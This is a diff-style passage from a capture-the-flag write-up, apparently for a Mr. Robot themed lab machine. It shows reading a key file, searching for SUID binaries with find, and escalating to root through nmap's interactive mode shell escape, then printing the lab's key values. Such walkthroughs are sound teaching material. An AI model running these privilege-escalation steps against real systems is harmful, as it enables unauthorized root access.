@@ -143,3 +143,63 @@ Once we navigate around a bit we find a user robot in the home directory with th
         Press 'q' or Ctrl-C to abort, almost any other key for status
         abcdefghijklmnopqrstuvwxyz (?)  
 
+
+Lets change users and read that key file
+
+        robot@linux:~$ cat key-2-of-3.txt
+        cat key-2-of-3.txt
+        822c73956184f694993bede3eb39f959
+
+Now to see if we can escilate futher
+
+        robot@linux:~$ find / -type f -perm -04000 2>/dev/null
+        find / -type f -perm -04000 2>/dev/null
+        /bin/ping
+        /bin/umount
+        /bin/mount
+        /bin/ping6
+        /bin/su
+        /usr/bin/passwd
+        /usr/bin/newgrp
+        /usr/bin/chsh
+        /usr/bin/chfn
+        /usr/bin/gpasswd
+        /usr/bin/sudo
+        /usr/local/bin/nmap
+
+
+we have SUID set for nmap which is vulnerable according to gtfo bins using the following commands
+
+        sudo nmap --interactive
+        nmap> !sh
+        
+Performing those commands gets us a root shell.
+
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+        Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+        Welcome to Interactive Mode -- press h <enter> for help
+        nmap> !sh
+        !sh
+        # whoami
+        whoami
+        root
+
+
+        # cd /root; ls -la
+        cd /root; ls -la
+        total 32
+        drwx------  3 root root 4096 Nov 13  2015 .
+        drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+        -rw-------  1 root root 4058 Nov 14  2015 .bash_history
+        -rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+        drwx------  2 root root 4096 Nov 13  2015 .cache
+        -rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+        -r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+        -rw-r--r--  1 root root  140 Feb 20  2014 .profile
+        -rw-------  1 root root 1024 Sep 16  2015 .rnd
+        # cat key-3-of-3.txt
+        cat key-3-of-3.txt
+        04787ddef27c3dee1ee161b21670b4e4
+
